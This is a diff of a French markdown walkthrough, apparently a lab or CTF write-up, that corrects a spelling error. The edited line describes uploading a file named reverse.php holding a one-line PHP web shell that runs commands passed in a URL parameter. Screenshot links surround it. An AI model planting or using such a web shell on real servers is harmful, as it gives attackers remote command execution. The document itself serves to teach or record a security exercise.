@@ -28,7 +28,7 @@ Et qu'il nous affiche bien le PHPinfo
 
 <img width="1498" alt="Capture d’écran 2022-07-19 à 07 51 52" src="https://user-images.githubusercontent.com/109574266/179677233-e6fc6907-0143-455f-8607-eed84be55c02.png">
 
-Nous décidons alors d'uploader un fichier nommer reverse.php avec la commande : <?=`$_GET[1]`?>
+Nous décidons alors d'uploader un fichier nommé reverse.php avec la commande : <?=`$_GET[1]`?>
 
 <img width="1498" alt="Capture d’écran 2022-07-19 à 07 53 20" src="https://user-images.githubusercontent.com/109574266/179677396-988f0e17-0ba9-436f-a008-d9ad0ccc62d2.png">
 
